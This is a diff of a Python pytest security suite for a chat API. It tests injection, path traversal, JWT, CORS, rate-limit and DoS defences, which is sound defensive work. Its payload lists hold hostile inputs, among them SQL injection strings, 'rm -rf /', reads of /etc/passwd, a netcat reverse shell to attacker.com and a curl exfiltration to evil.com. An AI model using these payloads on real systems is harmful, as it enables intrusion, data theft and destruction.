-        disclosure_found = False
-        
-        for path in disclosure_paths:
-            try:
-                response = requests.get(f"{BASE_URL}{path}", timeout=TIMEOUT)
                 if response.status_code == 200:
-                    disclosure_found = True
-                    # Check for contact information
-                    content = response.text.lower()
-                    contact_indicators = ["contact:", "email:", "security@"]
+                    response_data = response.json()
+                    response_text = str(response_data)
                     
-                    has_contact = any(indicator in content for indicator in contact_indicators)
-                    if has_contact:
-                        assert True
-                        break
-                        
-            except requests.exceptions.ConnectionError:
-                continue
+                    # Response should not contain executable script tags
+                    assert '<script>' not in response_text.lower()
+                    assert 'javascript:' not in response_text.lower()
+                    assert 'onerror=' not in response_text.lower()
+                    assert 'onload=' not in response_text.lower()
+    
+    @pytest.mark.asyncio
+    async def test_sql_injection_protection(self):
+        """Test protection against SQL injection"""
+        sql_payloads = [
+            "'; DROP TABLE users; --",
+            "' OR '1'='1",
+            "' UNION SELECT * FROM users --",
+            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
+            "' OR 1=1 --",
+            "admin'--",
+            "' OR 'a'='a",
+            "'; EXEC xp_cmdshell('dir'); --"
+        ]
         
-        if not disclosure_found:
-            pytest.skip("Vulnerability disclosure policy not found (may not be required)")
-        else:
-            assert True
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for payload in sql_payloads:
+                # Test in chat message (which might query database)
+                chat_request = {
+                    'message': payload,
+                    'model': 'tinyllama'
+                }
+                
+                response = await client.post(
+                    f"{BASE_URL}/api/v1/chat/",
+                    json=chat_request
+                )
+                
+                # Should handle gracefully, not return database errors
+                if response.status_code == 200:
+                    response_text = response.text.lower()
+                    
+                    # Should not contain database error messages
+                    assert 'sql' not in response_text
+                    assert 'database' not in response_text
+                    assert 'table' not in response_text
+                    assert 'syntax error' not in response_text
+                else:
+                    # Should return appropriate error, not 500
+                    assert response.status_code in [400, 422]
+    
+    @pytest.mark.asyncio
+    async def test_command_injection_protection(self):
+        """Test protection against command injection"""
+        command_payloads = [
+            '; ls -la',
+            '&& cat /etc/passwd',
+            '| whoami',
+            '; rm -rf /',
+            '`cat /etc/passwd`',
+            '$(cat /etc/passwd)',
+            '; nc -e /bin/sh attacker.com 4444',
+            '&& curl http://evil.com/steal?data=$(cat /etc/passwd)'
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for payload in command_payloads:
+                chat_request = {
+                    'message': f'Process this: {payload}',
+                    'model': 'tinyllama'
+                }
+                
+                response = await client.post(
+                    f"{BASE_URL}/api/v1/chat/",
+                    json=chat_request
+                )
+                
+                if response.status_code == 200:
+                    response_text = response.text.lower()
+                    
+                    # Should not contain system file contents or command outputs
+                    assert 'root:x:0:0:root' not in response_text  # /etc/passwd content
+                    assert 'bin/bash' not in response_text
+                    assert 'total ' not in response_text  # ls output
+    
+    @pytest.mark.asyncio
+    async def test_path_traversal_protection(self):
+        """Test protection against path traversal attacks"""
+        path_payloads = [
+            '../../../etc/passwd',
+            '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam',
+            '....//....//....//etc//passwd',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+            '..%252f..%252f..%252fetc%252fpasswd',
+            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd'
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for payload in path_payloads:
+                # Test as parameter
+                response = await client.get(f"{BASE_URL}/api/v1/files/{quote(payload)}")
+                
+                # Should not allow access to system files
+                if response.status_code != 404:
+                    assert response.status_code in [400, 403, 422]
+                    
+                    if response.status_code == 200:
+                        content = response.text.lower()
+                        assert 'root:x:0:0' not in content  # /etc/passwd
+    
+    @pytest.mark.asyncio
+    async def test_large_input_handling(self):
+        """Test handling of excessively large inputs"""
+        # Test with very large message
+        large_message = 'A' * 100000  # 100KB
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            chat_request = {
+                'message': large_message,
+                'model': 'tinyllama'
+            }
+            
+            response = await client.post(
+                f"{BASE_URL}/api/v1/chat/",
+                json=chat_request
+            )
+            
+            # Should handle gracefully (accept, reject, or timeout)
+            assert response.status_code in [200, 413, 422, 400]
+            
+            # If accepted, should not crash or return huge response
+            if response.status_code == 200:
+                assert len(response.text) < 1000000  # Response should be reasonable size
+    
+    @pytest.mark.asyncio
+    async def test_malformed_json_handling(self):
+        """Test handling of malformed JSON inputs"""
+        malformed_payloads = [
+            '{"message": "test", "model":',  # Incomplete JSON
+            '{"message": "test", "model": "tinyllama"}extra',  # Extra data
+            '{"message": "test", "model": "tinyllama", }',  # Trailing comma
+            '{message: "test", model: "tinyllama"}',  # Unquoted keys
+            '{"message": "test\\u0000", "model": "tinyllama"}'  # Null byte
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for payload in malformed_payloads:
+                response = await client.post(
+                    f"{BASE_URL}/api/v1/chat/",
+                    content=payload,
+                    headers={'Content-Type': 'application/json'}
+                )
+                
+                # Should return proper error, not 500
+                assert response.status_code in [400, 422]
+
+
+@pytest.mark.security
+class TestAuthentication:
+    """Test authentication mechanisms"""
+    
+    @pytest.mark.asyncio
+    async def test_protected_endpoints_require_auth(self):
+        """Test that protected endpoints require authentication"""
+        protected_endpoints = [
+            '/api/v1/admin/users',
+            '/api/v1/admin/config',
+            '/api/v1/system/shutdown',
+            '/api/v1/admin/logs'
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for endpoint in protected_endpoints:
+                response = await client.get(f"{BASE_URL}{endpoint}")
+                
+                # Should require authentication (401) or not exist (404)
+                assert response.status_code in [401, 403, 404]
+    
+    @pytest.mark.asyncio
+    async def test_invalid_token_handling(self):
+        """Test handling of invalid JWT tokens"""
+        invalid_tokens = [
+            'invalid.token.here',
+            'Bearer invalid_token',
+            'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature',
+            '',
+            'Bearer ',
+            'Basic dGVzdDp0ZXN0'  # Basic auth instead of JWT
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for token in invalid_tokens:
+                headers = {'Authorization': token} if token else {}
+                
+                response = await client.get(
+                    f"{BASE_URL}/api/v1/admin/users",
+                    headers=headers
+                )
+                
+                # Should reject invalid tokens
+                assert response.status_code in [401, 403, 404]
+    
+    @pytest.mark.asyncio
+    async def test_jwt_token_validation(self):
+        """Test JWT token structure validation"""
+        # Create a JWT with invalid signature
+        header = base64.urlsafe_b64encode(json.dumps({
+            "alg": "HS256",
+            "typ": "JWT"
+        }).encode()).decode().rstrip('=')
+        
+        payload = base64.urlsafe_b64encode(json.dumps({
+            "user_id": "test_user",
+            "exp": int(time.time()) + 3600
+        }).encode()).decode().rstrip('=')
+        
+        fake_signature = base64.urlsafe_b64encode(b'fake_signature').decode().rstrip('=')
+        fake_jwt = f"{header}.{payload}.{fake_signature}"
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            response = await client.get(
+                f"{BASE_URL}/api/v1/admin/users",
+                headers={'Authorization': f'Bearer {fake_jwt}'}
+            )
+            
+            # Should reject token with invalid signature
+            assert response.status_code in [401, 403, 404]
+    
+    @pytest.mark.asyncio
+    async def test_session_timeout(self):
+        """Test session timeout handling"""
+        # Create expired JWT
+        expired_payload = {
+            "user_id": "test_user",
+            "exp": int(time.time()) - 3600  # Expired 1 hour ago
+        }
+        
+        # Note: We can't create a valid signature without the secret,
+        # but we can test the structure
+        try:
+            expired_token = jwt.encode(expired_payload, 'fake_secret', algorithm='HS256')
+            
+            async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+                response = await client.get(
+                    f"{BASE_URL}/api/v1/admin/users",
+                    headers={'Authorization': f'Bearer {expired_token}'}
+                )
+                
+                # Should reject expired token
+                assert response.status_code in [401, 403, 404]
+        except ImportError:
+            # PyJWT not available, skip this specific test
+            pytest.skip("PyJWT not available for token creation")
+
+
+@pytest.mark.security
+class TestAuthorization:
+    """Test authorization and access control"""
+    
+    @pytest.mark.asyncio
+    async def test_rbac_enforcement(self):
+        """Test role-based access control"""
+        # Test different role scenarios (if implemented)
+        admin_endpoints = [
+            '/api/v1/admin/users',
+            '/api/v1/admin/system',
+            '/api/v1/admin/config'
+        ]
+        
+        user_endpoints = [
+            '/api/v1/user/profile',
+            '/api/v1/user/preferences'
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            # Test without any authentication
+            for endpoint in admin_endpoints + user_endpoints:
+                response = await client.get(f"{BASE_URL}{endpoint}")
+                assert response.status_code in [401, 403, 404]
+    
+    @pytest.mark.asyncio
+    async def test_privilege_escalation_prevention(self):
+        """Test prevention of privilege escalation"""
+        escalation_attempts = [
+            '/api/v1/admin/../admin/users',
+            '/api/v1/user/../../admin/config',
+            '/api/v1//admin//users',
+            '/api/v1/./admin/./users'
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for endpoint in escalation_attempts:
+                response = await client.get(f"{BASE_URL}{endpoint}")
+                # Should not allow access to admin endpoints through path manipulation
+                assert response.status_code in [400, 401, 403, 404]
+
+
+@pytest.mark.security
+class TestDataSecurity:
+    """Test data security and privacy"""
+    
+    @pytest.mark.asyncio
+    async def test_sensitive_data_exposure(self):
+        """Test that sensitive data is not exposed in responses"""
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            # Test various endpoints for sensitive data leakage
+            endpoints = [
+                '/health',
+                '/metrics',
+                '/api/v1/system/info',
+                '/api/v1/models/',
+            ]
+            
+            sensitive_patterns = [
+                r'password["\s]*[:=]["\s]*\w+',
+                r'secret["\s]*[:=]["\s]*\w+',
+                r'token["\s]*[:=]["\s]*[\w\-\.]+',
+                r'key["\s]*[:=]["\s]*[\w\-\.]+',
+                r'api_key["\s]*[:=]["\s]*[\w\-\.]+',
+                r'database_url["\s]*[:=]',
+                r'redis_url["\s]*[:=]',
+                r'postgresql://.*:.*@'
+            ]
+            
+            for endpoint in endpoints:
+                response = await client.get(f"{BASE_URL}{endpoint}")
+                
+                if response.status_code == 200:
+                    response_text = response.text.lower()
+                    
+                    for pattern in sensitive_patterns:
+                        matches = re.findall(pattern, response_text, re.IGNORECASE)
+                        assert not matches, f"Sensitive data exposed in {endpoint}: {matches}"
+    
+    @pytest.mark.asyncio
+    async def test_information_disclosure(self):
+        """Test for information disclosure vulnerabilities"""
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            # Test error pages for information disclosure
+            response = await client.get(f"{BASE_URL}/nonexistent-endpoint")
+            
+            if response.status_code == 404:
+                error_text = response.text.lower()
+                
+                # Should not expose internal paths, versions, or stack traces
+                assert '/opt/sutazaiapp' not in error_text
+                assert 'traceback' not in error_text
+                assert 'python' not in error_text or 'version' not in error_text
+                assert 'fastapi' not in error_text or 'version' not in error_text
+    
+    @pytest.mark.asyncio
+    async def test_headers_security(self):
+        """Test security headers are properly set"""
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            response = await client.get(f"{BASE_URL}/health")
+            
+            headers = response.headers
+            
+            # Check for important security headers
+            # Note: Not all may be implemented yet
+            security_headers = {
+                'X-Content-Type-Options': 'nosniff',
+                'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
+                'X-XSS-Protection': '1; mode=block'
+            }
+            
+            for header_name, expected_values in security_headers.items():
+                if header_name in headers:
+                    header_value = headers[header_name]
+                    if isinstance(expected_values, list):
+                        assert header_value in expected_values
+                    else:
+                        assert header_value == expected_values
+    
+    @pytest.mark.asyncio
+    async def test_cors_configuration(self):
+        """Test CORS configuration is secure"""
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            # Test preflight request
+            response = await client.options(
+                f"{BASE_URL}/api/v1/chat/",
+                headers={
+                    'Origin': 'https://evil.com',
+                    'Access-Control-Request-Method': 'POST',
+                    'Access-Control-Request-Headers': 'Content-Type'
+                }
+            )
+            
+            if 'Access-Control-Allow-Origin' in response.headers:
+                allowed_origin = response.headers['Access-Control-Allow-Origin']
+                
+                # Should not allow all origins in production
+                assert allowed_origin != '*' or os.getenv('ENVIRONMENT') == 'development'
+                
+                # Should not allow arbitrary origins
+                assert 'evil.com' not in allowed_origin
+
+
+@pytest.mark.security
+class TestNetworkSecurity:
+    """Test network-level security"""
+    
+    @pytest.mark.asyncio
+    async def test_http_methods_restriction(self):
+        """Test that only allowed HTTP methods are accepted"""
+        dangerous_methods = ['TRACE', 'CONNECT', 'PATCH']
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for method in dangerous_methods:
+                try:
+                    response = await client.request(method, f"{BASE_URL}/health")
+                    # Should not allow dangerous methods
+                    assert response.status_code in [405, 501]
+                except Exception:
+                    # Method not supported by client - that's also acceptable
+                    pass
+    
+    @pytest.mark.asyncio
+    async def test_rate_limiting(self):
+        """Test rate limiting protection"""
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            # Send many requests quickly
+            responses = []
+            
+            for i in range(100):
+                try:
+                    response = await client.get(f"{BASE_URL}/health")
+                    responses.append(response.status_code)
+                except Exception:
+                    # Connection might be refused due to rate limiting
+                    responses.append(429)
+                
+                # Small delay to avoid overwhelming the test system
+                await asyncio.sleep(0.01)
+            
+            # Should have some successful responses
+            success_count = sum(1 for status in responses if status == 200)
+            assert success_count > 0
+            
+            # Rate limiting might kick in (429), but not required for this test
+            # Just ensure system doesn't crash
+            crash_indicators = [500, 502, 503]
+            crash_count = sum(1 for status in responses if status in crash_indicators)
+            assert crash_count < 10  # Less than 10% crashes acceptable
+    
+    @pytest.mark.asyncio
+    async def test_slowloris_protection(self):
+        """Test protection against slow HTTP attacks"""
+        # This is a simplified test - real slowloris would be more complex
+        async with httpx.AsyncClient(timeout=30.0) as client:
+            start_time = time.time()
+            
+            # Send request with very slow data
+            try:
+                response = await client.post(
+                    f"{BASE_URL}/api/v1/chat/",
+                    json={'message': 'test', 'model': 'tinyllama'},
+                    timeout=30.0
+                )
+                
+                elapsed = time.time() - start_time
+                
+                # Should respond within reasonable time even with slow client
+                assert elapsed < 30.0
+                assert response.status_code in [200, 408, 413, 422]
+                
+            except httpx.TimeoutException:
+                # Timeout is acceptable protection
+                pass
+
+
+@pytest.mark.security
+class TestCryptography:
+    """Test cryptographic implementations"""
+    
+    def test_password_hashing_security(self):
+        """Test password hashing meets security standards"""
+        # This would test the actual password hashing implementation
+        # For now, we test general principles
+        
+        test_password = "test_password_123"
+        
+        # Simulate password hashing (would use actual implementation)
+        import hashlib
+        salt = secrets.token_hex(32)
+        hashed = hashlib.pbkdf2_hmac('sha256', test_password.encode(), salt.encode(), 100000)
+        
+        # Hash should be different from password
+        assert hashed != test_password.encode()
+        
+        # Hash should be deterministic with same salt
+        hashed2 = hashlib.pbkdf2_hmac('sha256', test_password.encode(), salt.encode(), 100000)
+        assert hashed == hashed2
+        
+        # Different passwords should produce different hashes
+        different_hash = hashlib.pbkdf2_hmac('sha256', 'different_password'.encode(), salt.encode(), 100000)
+        assert hashed != different_hash
+    
+    def test_random_generation_quality(self):
+        """Test quality of random number generation"""
+        # Generate multiple random values
+        random_values = [secrets.token_hex(32) for _ in range(100)]
+        
+        # Should all be unique
+        assert len(set(random_values)) == 100
+        
+        # Should have proper length
+        assert all(len(val) == 64 for val in random_values)  # 32 bytes = 64 hex chars
+        
+        # Should contain varied characters
+        combined = ''.join(random_values)
+        unique_chars = set(combined)
+        assert len(unique_chars) >= 10  # Should use most hex digits
+    
+    def test_secure_token_generation(self):
+        """Test secure token generation"""
+        # Generate API tokens
+        tokens = [secrets.token_urlsafe(32) for _ in range(50)]
+        
+        # Should all be unique
+        assert len(set(tokens)) == 50
+        
+        # Should be URL-safe
+        import string
+        allowed_chars = string.ascii_letters + string.digits + '-_'
+        for token in tokens:
+            assert all(c in allowed_chars for c in token)
+
+
+@pytest.mark.security
+class TestDenialOfService:
+    """Test protection against DoS attacks"""
+    
+    @pytest.mark.asyncio
+    async def test_resource_exhaustion_protection(self):
+        """Test protection against resource exhaustion"""
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            # Test with many concurrent connections
+            async def make_request():
+                try:
+                    response = await client.get(f"{BASE_URL}/health")
+                    return response.status_code == 200
+                except Exception:
+                    return False
+            
+            # Create 50 concurrent requests
+            tasks = [make_request() for _ in range(50)]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Should handle most requests successfully
+            success_count = sum(1 for result in results if result is True)
+            assert success_count >= 25  # At least 50% success rate
+    
+    @pytest.mark.asyncio
+    async def test_memory_bomb_protection(self):
+        """Test protection against memory exhaustion attacks"""
+        # Test with large JSON payload
+        large_data = {'message': 'A' * 100000, 'model': 'tinyllama'}
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            response = await client.post(
+                f"{BASE_URL}/api/v1/chat/",
+                json=large_data
+            )
+            
+            # Should handle large payload gracefully
+            assert response.status_code in [200, 413, 422]
+            
+            # If accepted, response should be reasonable size
+            if response.status_code == 200:
+                assert len(response.content) < 1000000  # Less than 1MB response
+    
+    @pytest.mark.asyncio
+    async def test_cpu_exhaustion_protection(self):
+        """Test protection against CPU exhaustion"""
+        # Send complex regex patterns or computationally expensive inputs
+        complex_patterns = [
+            'a' * 1000 + '(a+)+' + 'b' * 1000,  # Regex DoS pattern
+            '((((((((((x))))))))))' * 100,  # Nested patterns
+            'x' * 10000,  # Very long string
+        ]
+        
+        async with httpx.AsyncClient(timeout=TEST_TIMEOUT) as client:
+            for pattern in complex_patterns:
+                start_time = time.time()
+                
+                response = await client.post(
+                    f"{BASE_URL}/api/v1/chat/",
+                    json={'message': pattern, 'model': 'tinyllama'}
+                )
+                
+                processing_time = time.time() - start_time
+                
+                # Should not take excessive time to process
+                assert processing_time < 30.0  # Maximum 30 seconds
+                
+                # Should handle gracefully
+                assert response.status_code in [200, 400, 422, 413]
+
+
+if __name__ == '__main__':
+    pytest.main([__file__, '-v', '--tb=short'])
